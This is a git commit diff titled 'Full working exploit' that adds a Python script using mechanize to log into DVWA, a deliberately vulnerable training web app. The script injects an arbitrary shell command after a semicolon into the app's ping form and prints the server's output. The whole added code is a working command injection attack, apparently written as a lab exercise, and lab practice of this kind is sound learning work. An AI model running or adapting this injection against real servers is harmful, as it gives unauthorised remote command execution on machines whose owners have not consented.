a74f483dc5e4226a330981e0f43a7bd40cd07c5a
Alex Gonzalez <a.gonzo92@gmail.com>
2017-11-04 15:57:03 -0400

    Full working exploit

--- pythonsploit/cmdinjection.py
+++ pythonsploit/cmdinjection.py
@@ -3,6 +3,24 @@ import argparse
 import mechanize
 import cookielib
 
+def main(username,password,victim_ip,cmd):
+	br = mechanize.Browser()
+	cj = cookielib.LWPCookieJar()
+	br.set_cookiejar(cj)
+	br.open("http://" + victim_ip + "/dvwa/login.php")
+	br.select_form(nr=0)
+	br["username"] = username
+	br["password"] = password
+	br.submit()
+
+	br.open("http://" + victim_ip + "/dvwa/vulnerabilities/exec/#")
+	br.select_form(nr=0)
+	br["ip"] = ";" + cmd
+	response = br.submit()
+	uglyhtml = response.read()
+	stdout = uglyhtml.partition('<pre>')[-1].rpartition('</pre>')[0]
+	print stdout
+
 parser = argparse.ArgumentParser(
 	epilog='Example: cmdinjection.py admin password 127.0.0.1 id')
 parser.add_argument("username", help="DVWA Login Username")
